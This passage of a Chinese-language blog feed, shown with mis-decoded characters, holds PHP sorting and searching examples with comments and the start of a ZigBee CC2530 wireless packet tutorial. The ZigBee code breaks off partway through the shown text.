punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//ä»ç¬¬äºŒä¸ªæ•°æ®å¼€å§‹ä¾æ¬¡å–å‡ºæ•°æ®ä¸å‰é¢å·²ç»æ’å¥½çš„è¿›è¡Œæ¯”è¾ƒ</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$i</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">//$arr[$j] = $temp;     //ä¼˜åŒ–åç•¥è¿‡äº†è¿™ä¸€æ¬¡èµ‹å€¼ï¼Œæ„æ€å°±æ˜¯tempå…ƒç´ ä¾æ—§å­˜åœ¨ï¼Œæ²¡è¿›å…¥æ•°ç»„ï¼Œå½“å‰é¢çš„å…ƒç´ éƒ½äº¤æ¢å®Œæˆåï¼Œæ‰åœ¨åé¢çš„ifè¯­å¥ä¸­è¿›è¡Œæœ€åçš„èµ‹å€¼æ“ä½œ</span>            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token comment">//è¿™é‡Œçš„ä½œç”¨æ˜¯å¦‚æœåœ¨åˆ¤æ–­çš„æ—¶å€™å–å‡ºæ¥çš„å°±å·²ç»æ¯”ä»–å·¦è¾¹çš„è¦å¤§äº†ï¼Œå°±ä¸ç”¨è¿›è¡Œäº¤æ¢äº†ï¼Œç›´æ¥break</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//å¦‚æœäº¤æ¢äº†ï¼Œåˆ™è¿›è¡Œtempèµ‹å€¼</span>        <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">;</span> <span class="token comment">//è¿™é‡Œ$jéœ€è¦åŠ ä¸€çš„åŸå› æ˜¯åœ¨ä¸Šé¢çš„å¾ªç¯æœ€åæ‰§è¡Œäº†ä¸€æ¬¡$j--çš„æ“ä½œï¼Œäºæ˜¯è¿™é‡Œéœ€è¦æŠŠ1åŠ ä¸Š</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$left</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$right</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€’å½’</span>    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€’å½’</span>    <span class="token keyword">return</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆå¹¶æ•°ç»„ï¼Œæ³¨æ„è¿™é‡Œå…ƒç´ å¿…é¡»å…¨æ˜¯æ•°ç»„æ‰èƒ½è¿›è¡Œæ“ä½œï¼Œ$arr[0]ä¸ºå…ƒç´ ï¼Œæ‰€ä»¥éœ€è¦å¼ºåˆ¶è½¬æ¢æˆæ•°ç»„ï¼Œæˆ–è€…ç”¨array($arr[0])ä¹Ÿå¯ä»¥</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="å½’å¹¶æ’åº"><a href="#å½’å¹¶æ’åº" class="headerlink" title="å½’å¹¶æ’åº"></a>å½’å¹¶æ’åº</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">;</span>    <span class="token variable">$a</span>  <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//èˆå»æ³•å–æ•´</span>    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//array_sliceä»æ•°ç»„ä¸­å–å‡ºä¸€æ®µåºåˆ—</span>    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€’å½’</span>    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€’å½’</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å½“æœ‰ä¸€è¾¹ä¸º0åˆ™ç»“æŸè¿”å›</span>        <span class="token variable">$m</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$left</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token variable">$right</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">array_shift</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åä¸¤ä¸ªæ•°ç»„çš„æ”¾ç½®å¯¹ç»“æœæ²¡å½±å“</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="æŸ¥æ‰¾ç®—æ³•"><a href="#æŸ¥æ‰¾ç®—æ³•" class="headerlink" title="æŸ¥æ‰¾ç®—æ³•"></a>æŸ¥æ‰¾ç®—æ³•</h3><p>è¿™é‡Œæœ‰ä¸€ç§æ•°ç»„éå†æŸ¥æ‰¾å°±æ²¡å†™äº†</p><h4 id="äºŒåˆ†æ³•æŸ¥æ‰¾"><a href="#äºŒåˆ†æ³•æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†æ³•æŸ¥æ‰¾"></a>äºŒåˆ†æ³•æŸ¥æ‰¾</h4><p>æ³¨ï¼šäºŒåˆ†æ³•æŸ¥æ‰¾å‰è¦æ±‚æ•°åˆ—æ˜¯å·²ç»æ’å¥½åºäº†çš„</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$left</span> <span class="token operator">&lt;=</span> <span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$middle</span> <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$left</span> <span class="token operator">+</span> <span class="token variable">$right</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$middle</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$middle</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$middle</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token variable">$middle</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token variable">$middle</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿™ä¸ªæ–¹æ³•åœ¨æŸ¥æ‰¾çš„æ—¶å€™å¦‚æœè¦æŸ¥çš„æ•°æ®ä¸åœ¨æ•°ç»„é‡Œå°±ä¼šæŠ¥ä¸‹é¢çš„æ³¨æ„äº‹é¡¹ï¼ˆåœ¨çš„è¯ä¸ä¼šæŠ¥é”™ï¼‰ï¼Œè¿”å›çš„ç»“æœ<code>false</code>è¿˜æ˜¯æœ‰çš„</p><pre class="language-none"><code class="language-none">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 7Notice:  Undefined offset: 9 in C:\xxx\test.php on line 10</code></pre><p>åŸå› è¿˜æ²¡æ‰¾åˆ°ï¼Œå¦‚æœæœ‰å¤§ä½¬çŸ¥é“çš„è¯æ¬¢è¿ç•™è¨€æŒ‡å‡ºï¼Œwtcl -_-ï¼Œæ²¡æœ‰çš„è¯å‘å…ˆç•™ç€åé¢å†å¡«</p><h4 id="äºŒåˆ†å½’å¹¶æ³•æŸ¥æ‰¾"><a href="#äºŒåˆ†å½’å¹¶æ³•æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†å½’å¹¶æ³•æŸ¥æ‰¾"></a>äºŒåˆ†å½’å¹¶æ³•æŸ¥æ‰¾</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$left</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$right</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$num</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$left</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBeeæ— çº¿é€šä¿¡æ•°æ®ä¼ è¾“</title>
      <link href="posts/ff0d7e8b/"/>
      <url>posts/ff0d7e8b/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Zigbeeæ— çº¿é€šä¿¡ï¼Œéœ€è¦é«˜é¢‘çš„è½½æ³¢æ¥æä¾›å‘å°„æ•ˆç‡ï¼ŒZigbeeæ¨¡å—ä¹‹é—´è¦å¯ä»¥æ­£å¸¸çš„æ”¶å‘ï¼Œæ¥æ”¶æ¨¡å—å¿…é¡»æŠŠæ¥æ”¶é¢‘ç‡è®¾ç½®å’Œå‘å°„æ¨¡å—çš„è½½æ³¢é¢‘ç‡ä¸€è‡´ã€‚</p></li><li><p>Zigbeeæœ‰27ä¸ªè½½æ³¢å¯ä»¥è¿›è¡Œé€šä¿¡ï¼Œè½½æ³¢å«åšä¿¡é“ï¼ˆæ— çº¿é€šä¿¡çš„é€šé“ï¼‰ã€‚è¿™äº›è½½æ³¢çš„é¢‘ç‡è½åœ¨æŸäº›é¢‘ç‡åŒºæ®µï¼Œæˆ‘ä»¬æŠŠè¿™äº›åŒºæ®µå«åšé¢‘æ®µã€‚TIçš„æ‰€æœ‰æ”¯æŒZigbeeåº•å±‚åè®®çš„èŠ¯ç‰‡åªèƒ½åœ¨2.4Gé¢‘æ®µçš„16ä¸ªä¿¡é“é‡Œè¿›è¡Œé€šä¿¡ã€‚å³ï¼š</p><blockquote><p>11  2405M</p><p>12  2410M</p><p>â€¦â€¦</p><p>26  2480M</p></blockquote></li><li><p>åœ¨Zigbeeæ— çº¿å±€åŸŸç½‘é‡Œï¼Œæ¯ä¸€æ¨¡å—éƒ½ä¸€ä¸ªåœ¨è¯¥ç½‘ç»œé‡Œå”¯ä¸€çš„2ä¸ªå­—èŠ‚çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å«åšç½‘ç»œåœ°å€ï¼Œç½‘ç»œçŸ­åœ°å€ã€‚</p></li></ol><span id="more"></span><ol start="4"><li><p>PANIDè¿™æ˜¯ä¸€ä¸ª2ä¸ªå­—èŠ‚çš„ç¼–ç ï¼Œç”¨æ¥åŒºåˆ«ä¸åŒçš„Zigbeeæ— çº¿å±€åŸŸç½‘ï¼Œä¸ªåŸŸç½‘ID.</p></li><li><p>æ— çº¿æ•°æ®åŒ…çš„å†…å®¹</p><blockquote><p>#define SENDVAL 5<br>char SendPacket[]={0x0C,0x61,0x88,0x00,0x07,0x20,0xEF,0xBE,0x20,0x50,SENDVAL};<br>//ç¬¬ä¸€ä¸ªå­—èŠ‚0x0Cå«ä¹‰ï¼Œè¿™ä¸ªè‡ªå·±åé¢è¿˜æœ‰12ä¸ªå­—èŠ‚è¦å‘é€<br>//ç¬¬5 6ä¸ªå­—èŠ‚è¡¨ç¤ºçš„æ˜¯PANID<br>//ç¬¬7 8ä¸ªå­—èŠ‚æ˜¯æ— çº¿æ¨¡å—ç›®æ ‡è®¾å¤‡çš„ç½‘ç»œåœ°å€ 0xBEEF<br>//ç¬¬9 10å°±æ˜¯æœ¬åœ°æ¨¡å—çš„ç½‘ç»œåœ°å€<br>//11 ä¸ªå­—èŠ‚æ˜¯æˆ‘ä»¬æœ‰ç”¨çš„æ•°æ®<br>// CRCç  12 13ä¸ªå­—èŠ‚ æ˜¯ç¡¬ä»¶è‡ªåŠ¨è¿½åŠ </p></blockquote></li></ol><p>å®éªŒä»£ç ï¼š</p><p>æŒ‰é’®æ§åˆ¶æ•°ç ç®¡çš„æ•°å­—æ˜¾ç¤ºå˜åŒ–</p><p>å‘é€ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SENDVAL</span> <span class="token expression"><span class="token number">5</span></span></span><span class="token keyword">char</span> SendPacket<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0xBE</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>SENDVAL<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//ç¬¬ä¸€ä¸ªå­—èŠ‚0x0Cå«ä¹‰ï¼Œè¿™ä¸ªè‡ªå·±åé¢è¿˜æœ‰12ä¸ªå­—èŠ‚è¦å‘é€</span><span class="token comment">//ç¬¬5 6ä¸ªå­—èŠ‚è¡¨ç¤ºçš„æ˜¯PANID</span><span class="token comment">//ç¬¬7 8ä¸ªå­—èŠ‚æ˜¯æ— çº¿æ¨¡å—ç›®æ ‡è®¾å¤‡çš„ç½‘ç»œåœ°å€ 0xBEEF</span><span class="token comment">//ç¬¬9 10å°±æ˜¯æœ¬åœ°æ¨¡å—çš„ç½‘ç»œåœ°å€</span><span class="token comment">//11 ä¸ªå­—èŠ‚æ˜¯æˆ‘ä»¬æœ‰ç”¨çš„æ•°æ®</span><span class="token comment">// CRCç  12 13ä¸ªå­—èŠ‚ æ˜¯ç¡¬ä»¶è‡ªåŠ¨è¿½åŠ </span><span class="token keyword">void</span> <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//å»¶æ—¶å‡½æ•°</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> y<span class="token punctuation">,</span>x<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>y<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>y<span class="token operator">--</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span>x<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>x<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è®¾ç½®ä¸º32Mæ™¶æŒ¯</span><span class="token punctuation">&#123;</span>   SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 å¼€å¯2ä¸ªé«˜é¢‘æ—¶é’Ÿæº</span>   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span 